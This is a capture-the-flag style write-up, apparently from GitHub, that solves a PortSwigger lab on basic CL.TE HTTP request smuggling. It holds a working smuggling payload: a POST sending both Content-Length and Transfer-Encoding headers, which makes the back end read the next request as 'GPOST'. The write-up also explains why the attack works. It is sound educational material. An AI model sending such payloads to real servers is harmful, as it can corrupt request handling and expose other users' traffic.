# HTTP request smuggling, basic CL.TE vulnerability

## 1. Lab Goal
Smuggle a request to the back-end server so that the next request processed by the back-end appears to use the method GPOST.

<img width="1483" height="902" alt="Screenshot 2026-10-04 090516" src="https://github.com/user-attachments/assets/a05c4187-edcd-44dc-9a47-0ac2c16cdce2" />

## 2. Vulnerability
### CL.TE Request Smuggling
The lab uses a front-end and a back-end server that interpret the request body differently.
Front-end → Content-Length
Back-end  → Transfer-Encoding
Therefore, the vulnerability type is: CL.TE
Why?
The front-end doesn't support chunked encoding, while the back-end does.
This difference allows us to make the two servers disagree about where the request ends.

## 3. Exploitation
We send a request containing both:

- `Content-Length: 6`
- `Transfer-Encoding: chunked`

### Payload

```http
POST / HTTP/1.1
Host: <LAB-HOST>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### What does this do?

The back-end processes the body using chunked encoding.

It sees:

```text
0
```

which means:

**End of the chunked request.**

The `G` is then left at the beginning of the connection.

So the next request:

```http
POST / HTTP/1.1
```

becomes:

```http
GPOST / HTTP/1.1
```

## 4. First Send
   
<img width="1469" height="701" alt="Screenshot 2026-10-04 091156" src="https://github.com/user-attachments/assets/92fb3051-1705-484d-87b4-f3d56246b9af" />

### Observation

The first request successfully places the `G` at the beginning of the back-end connection.

However, the final `GPOST` result has not appeared yet.

## 5. Second Send — Successful Smuggling
   
<img width="1231" height="368" alt="Screenshot 2026-10-04 091223" src="https://github.com/user-attachments/assets/71ceffb9-2fc9-49ba-b74f-2299997a8e9d" />

### What happened?

The second request starts with:

```http
POST / HTTP/1.1
```

Because the previous request left `G` in the connection, the back-end interprets the request as:

```http
GPOST / HTTP/1.1
```

The server doesn't recognize `GPOST` as a valid HTTP method.

Therefore:

```text
Unrecognized method GPOST
```

This confirms that the request was successfully smuggled.

## 6. Lab Solved

   <img width="1762" height="864" alt="Screenshot 2026-10-04 091548" src="https://github.com/user-attachments/assets/6c6e8c64-dc2c-4929-b25c-029ade078bca" />

## 7. Key Takeaway

HTTP Request Smuggling occurs when the front-end and back-end servers disagree about where an HTTP request ends.

In this lab: [HTTP Request Smuggling — Basic CL.TE](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

**Front-end** → `Content-Length`
**Back-end**  → `Transfer-Encoding`

By exploiting this difference, the `G` was left in the back-end connection and prepended to the next `POST` request.

As a result, the back-end processed:

```http
GPOST / HTTP/1.1
```

This confirmed the CL.TE request smuggling vulnerability.

## Lab

[HTTP Request Smuggling — Basic CL.TE](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
